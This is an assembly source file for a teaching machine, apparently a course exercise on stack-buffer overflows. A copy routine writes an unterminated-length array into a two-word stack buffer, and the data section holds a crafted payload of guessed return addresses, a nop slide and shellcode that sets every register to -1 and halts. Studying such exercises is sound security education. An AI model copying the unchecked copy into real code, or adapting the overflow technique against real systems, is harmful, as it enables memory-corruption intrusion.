.pos 0x100
start:           ld   $stackBtm, r5       # [01] sp = address of last word of stack
                 inca r5                  # [02] sp = address of word after stack
                 gpc  $0x6, r6            # [03] r6 = pc + 6
                 j    copy                # [04] call copy()              
                 halt

.pos 0x200      # note: i needs to be in a register.
copy:           deca r5                   # allocate space for ra
                st r6, (r5)               # save the ra
                ld $src, r1               # r1 = src
                deca r5                   # allocate space for int dst[2]
                deca r5
                ld $0, r2                 # r2 = i = 0
loop:           ld (r1, r2, 4), r3        # r3 = temp = src[i]
                beq r3, end               # goto end if src[i] == 0
                st r3, (r5, r2, 4)        # dst[i] = src[i]
                inc r2                    # i++
                br loop                   # goto loop
end:            ld $0, r0                 # r0 = 0
                st r0, (r5, r2, 4)        # dst[i] = 0 (null termination of string)
                ld 8(r5), r6              # restore ra
                inca r5                   # deallocate the stack used for the ra
                inca r5                   # deallocate the stack used for int dst[2]
                inca r5
                j (r6)                    # return


.pos 0x1000
src:            .long 0x2064              # "guess" where the stack is and try to point to somewhere on the nop slide
                .long 0x2064
                .long 0x2064
                .long 0x2064
                .long 0x2064
                .long 0x2064
                .long 0x2064
                .long 0x2064
                .long 0x2064
                .long 0x2064
                .long 0x2064
                .long 0x2064
                .long 0x2064
                .long 0x2064
                .long 0xff00ff00            # nop slide
                .long 0xff00ff00            # nop slide
                .long 0xff00ff00            # nop slide
                .long 0xff00ff00            # nop slide                
                .long 0xff00ff00            # nop slide
                .long 0xff00ff00            # nop slide
                .long 0xff00ff00            # nop slide
                .long 0xff00ff00            # nop slide
                .long 0xff00ff00            # nop slide
                .long 0xff00ff00            # nop slide                                                                                            
                .long 0xff00ff00            # nop slide
                .long 0xff00ff00            # nop slide                                
                .long 0xff00ff00            # nop slide
                .long 0xff00ff00            # nop slide
                .long 0xff00ff00            # nop slide
                .long 0xff00ff00            # nop slide
                .long 0xff00ff00            # nop slide
                .long 0xff00ff00            # nop slide
                .long 0xff00ff00            # nop slide
                .long 0xff00ff00            # nop slide
                .long 0xff00ff00            # nop slide
                .long 0xff00ff00            # nop slide
                .long 0xff00ff00            # nop slide
                .long 0xff00ff00            # nop slide
                .long 0xff00ff00            # nop slide
                .long 0xff00ff00            # nop slide
                .long 0xff00ff00            # nop slide
                .long 0x0100ffff            # ld $-1, r1
                .long 0xffffff00            # finished with nop
                .long 0x0200ffff            # ld $-1, r2
                .long 0xffffff00            # finished with nop
                .long 0x0300ffff            # ld $-1, r3
                .long 0xffffff00            # finished with nop
                .long 0x0400ffff            # ld $-1, r4
                .long 0xffffff00            # finished with nop
                .long 0x0500ffff            # ld $-1, r5
                .long 0xffffff00            # finished with nop
                .long 0x0600ffff            # ld $-1, r6
                .long 0xffffff00            # finished with nop
                .long 0x0700ffff            # ld $-1, r7
                .long 0xffffff00            # finished with nop
                .long 0x0000ffff            # ld $-1, r0
                .long 0xffffff00            # finished with nop
                .long 0xff00f000            # nop then halt
                .long 0x0                   # null termination for the "string"

.pos 0x2000
stackTop:        .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0                
                 .long 0x0
                 .long 0x0
                 .long 0x0                
                 .long 0x0
stackBtm:        .long 0x0